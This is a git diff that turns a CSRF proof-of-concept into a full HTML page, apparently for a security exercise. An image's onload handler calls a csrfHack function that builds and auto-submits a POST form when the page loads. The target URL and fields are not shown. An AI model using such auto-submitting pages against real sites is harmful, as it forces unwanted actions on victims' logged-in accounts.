@@ -1,3 +1,29 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+
+    <title>Beep Bop Boop</title>
+
+    <style>
+      html {
+        font-family: sans-serif;
+      }
+
+      body {
+        width: 50%;
+        max-width: 800px;
+        min-width: 480px;
+        margin: 0 auto;
+      }
+    </style>
+  </head>
+
+  <body>
+    <p><img src='https://clintmint.github.io/hacking-in-progress.gif' onload=csrfHack()></p>
+    
+    <script>
+
 function csrfHack() {
   const form = document.createElement('form');
   form.method = 'post';
@@ -11,4 +37,6 @@ function csrfHack() {
   form.submit();
 }
 
-<img src='https://clintmint.github.io/hacking-in-progress.gif' onload=csrfHack()>
+    </script>
+  </body>
+</html>
